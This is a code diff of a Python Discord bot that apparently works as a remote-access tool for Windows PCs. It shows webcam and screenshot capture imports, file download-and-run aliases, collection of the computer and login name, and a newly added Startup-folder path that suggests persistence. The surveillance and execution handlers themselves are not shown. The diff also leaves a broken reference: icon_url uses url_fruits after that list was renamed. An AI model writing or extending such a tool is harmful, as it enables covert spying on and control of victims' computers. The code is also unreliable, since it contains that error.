@@ -1,18 +1,22 @@
 from urllib.request import urlretrieve as download
 from random import randint, random
+
+import os
 from os import startfile as start
+from os import remove as delete
+
+from re import split, findall
+
+from datetime import datetime
+# import time as time_class
 
 from discord.ext import commands
 from discord import Game, Embed
 import discord
 
-from os import remove as delete
-from datetime import datetime
-from re import split, findall
-import time as time_class
 import asyncio
 import json
-import os
+
 
 web_module_exist = True  # существование модуля для вебки
 screen_module_exist = True  # существование модуля для скринов
@@ -22,14 +26,14 @@ try:
     import numpy as np
     import imageio
 except BaseException:
-    print("Не импортировалась библиотеку камеры")
     web_module_exist = False
+    print("Не импортировалась библиотеку cv2/numpy/imageio")
 
 try:
     from PIL import ImageGrab
 except BaseException:
-    print("Не импортировалась библиотеку скринов")
     screen_module_exist = False
+    print("Не импортировалась библиотеку скринов")
 
 from id import ID
 
@@ -41,11 +45,15 @@ ALL_COMMANDS = ["!ahk",
                 "",
                 ]
 
-client = commands.Bot(command_prefix="?")
+client = commands.Bot(command_prefix="!")
 privates = []
 is_privates = []
 login = os.getenv("COMPUTERNAME")  # login of PC
 file_name = os.path.dirname(__file__) + "/" + os.path.basename(__file__)  # file_name = os.path.basename(__file__)
+
+paths = dict()
+paths["APPDATA"] = os.getenv("APPDATA")
+paths["STARTUP"] = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 
 app_data = os.getenv("APPDATA")
 login_name = os.getlogin()
@@ -66,23 +74,23 @@ with open(os.path.dirname(__file__) + "/TOKEN") as f:
     for read in f:
         token = read
 
-url_fruits = [
-    'https://cdn.discordapp.com/emojis/504731857670242325.png?v=1',
-    "https://cdn.discordapp.com/emojis/504731916423921664.png?v=1",
-    'https://cdn.discordapp.com/emojis/504732125996515339.png?v=1',
-    'https://cdn.discordapp.com/emojis/504732177162829839.png?v=1',
-    'https://cdn.discordapp.com/emojis/504732162805727232.png?v=1',
-    'https://cdn.discordapp.com/emojis/504732420210425856.png?v=1',
-    'https://cdn.discordapp.com/emojis/504732459808587845.png?v=1',
-    'https://cdn.discordapp.com/emojis/504732435813236756.png?v=1',
-    'https://cdn.discordapp.com/emojis/504732015728394271.png?v=1',
-    'https://cdn.discordapp.com/emojis/504731807368085537.png?v=1',
-    'https://cdn.discordapp.com/emojis/504731761817944064.png?v=1',
-    'https://cdn.discordapp.com/emojis/504731586466545705.png?v=1',
-    'https://cdn.discordapp.com/emojis/504731550424891418.png?v=1'
+id_fruits = [
+    '504731857670242325',
+    "504731916423921664",
+    '504732125996515339',
+    '504732177162829839',
+    '504732162805727232',
+    '504732420210425856',
+    '504732459808587845',
+    '504732435813236756',
+    '504732015728394271',
+    '504731807368085537',
+    '504731761817944064',
+    '504731586466545705',
+    '504731550424891418'
 ]
 
-icon_url = url_fruits[randint(0, len(url_fruits) - 1)]
+icon_url = "https://cdn.discordapp.com/emojis/{}.png?v=1".format(url_fruits[randint(0, len(url_fruits) - 1)])
 
 
 def default_settings():
@@ -1231,6 +1239,19 @@ class DiscordLoop:
             """
             await Discord.send_embed()
             lost_screen_delay = screen_delay
+
+
+@client.command(name="add")
+async def add(ctx, left: int, right: int):
+    """Adds two numbers together."""
+    print("here")
+    await ctx.send(left + right)
+
+
+@client.command(name="ping")
+async def ping(ctx):
+    print("s")
+    await ctx.send('pong')
 
 
 @client.event
